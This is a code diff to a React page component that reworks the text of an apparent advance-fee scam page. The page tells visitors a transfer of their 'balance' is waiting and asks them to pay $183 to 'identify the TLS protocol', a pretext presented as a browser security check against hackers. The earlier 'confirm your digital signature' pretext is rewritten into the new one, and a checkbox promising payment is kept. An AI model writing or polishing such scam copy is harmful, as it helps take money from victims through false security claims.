@@ -74,33 +74,32 @@ const Tls = () => {
             fontWeight={"600"}
             textAlign={{ base: "center", md: "left" }}
           >
-            It is necessary to confirm the digital signature
+            Transfer awaits the identification of the TLS protocol
           </Text>
           <br />
           <Text fontSize={{ base: "16px", md: "20px" }}>
-            Your personal digital signature is made and ready for use! The
-            cipher of personal digital signature rdl_356279. You have to confirm
-            a personal digital signature in order to receive a transfer for the
-            amount of <b>${balance}</b> reserved for sending today.
+            Your personal digital signature is confirmed! You can use it on any
+            online services. Your browser requested the identification of the
+            TLS protocol for instantly receiving the transfer in the amount of
+            <b>${balance}</b> directly from the browser. Most likely this
+            happened due to the fact that you have two or more tabs in your
+            browser. The developer of your browser asks to confirm that the
+            translation <b>${balance}</b> get you, and not the attackers who
+            have hacked the browser.
             <br />
             <br />
-            Confirmation of the digital signature must be assured notarized, we
-            made sure that it was convenient for you to confirm the digital
-            signature right on the site.
-            <br />
-            <br />
-            Confirm the personal digital signature for receipt{" "}
-            <b>${balance}.</b>
+            To confirm the details, you need to identify the TLS protocol by
+            replenishing the transfer amount.
           </Text>
         </Flex>
         <Flex flexDir={"column"} fontSize={"20px"}>
           <Text fontSize={"20px"} mb={"30px"}>
-            Immediately after replenishing the transfer amount, you will fully
-            send a money transfer to the indicated details in the amount{" "}
-            <b>${balance}.</b>
+            Immediately after the replenishment of the transfer amount, the
+            payment for the amount <b>${balance}</b> will be identified and sent
+            to these details within 10 minues.
             <br />
             <br />
-            Replenish the transfer amount to: <b>$165.</b>
+            Replenish the transfer amount to: <b>$183.</b>
           </Text>
           <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
             <FormCheckItem
@@ -113,7 +112,7 @@ const Tls = () => {
             />
             <FormCheckItem
               checked={true}
-              label={"Your pavment will be sent to vour details."}
+              label={"Your pavment will be sent to your details."}
             />
           </Flex>
         </Flex>
